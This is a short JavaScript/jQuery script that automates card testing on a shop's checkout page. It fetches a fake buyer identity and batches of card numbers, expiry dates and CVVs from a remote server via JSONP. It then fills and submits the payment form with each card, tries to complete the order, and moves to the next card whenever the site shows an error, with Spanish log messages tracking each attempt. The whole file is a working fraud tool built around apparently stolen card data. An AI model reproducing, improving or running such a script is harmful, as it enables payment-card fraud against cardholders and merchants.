var postUrl = "https://" + baseUrl + "/post";
var fakeUrl = "https://" + baseUrl + "/fake?city=Miami";
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var fullname = "";
var zip = "";
var cards = function(arr) {
	var i = 0;
	var percentage = 30;
	var len = Math.ceil(arr.length * (percentage / 100));

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    $("a[href='#/payment']").click();


	    $("input[placeholder='Full Name']").val( fullname );
		$("input[data-encrypted-name=zipcode]").val( zip );
	    $("input[placeholder='Card Number']").val(json.card);
	    $("select[data-encrypted-name=month]").val(Number(json.mon));
        $("select[data-encrypted-name=year]").val("20" + json.year);
	    $("input[placeholder=Code]").val(json.cvv);
	    $("input[type=submit]").click();

    	var interval = setInterval(function() {
	        console.log("Tratamos de guardar la tarjeta")
	        if ( !$(".blockUI").length ) {
	        	console.log("Tarjeta guardada");
	        	clearInterval(interval);

	        	$("a[ng-click='completeOrder()']").click();

	        	var interval2 = setInterval(function() {
	        		console.log("Procesando...");
	        		if( !$("div[ng-show='notifier.messages.length > 0']").hasClass("ng-hide") ) {
	        			clearInterval(interval2);
	        			console.log("No paso, probemos otra");
	        			setTimeout(iteration, 3000);
	        		}

	        	}, 2000)
	    	}
	    }, 1000);

	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
var fake = function( person ) {
	console.log( person.fullname );
	console.log( person.zip );

	fullname = person.firstname + " " + person.lastname;
	zip = person.zip;

	options.url = postUrl;
	$.ajax(options)
	.success(cards);
}
// Dstld
$.ajax(options)
.success(fake);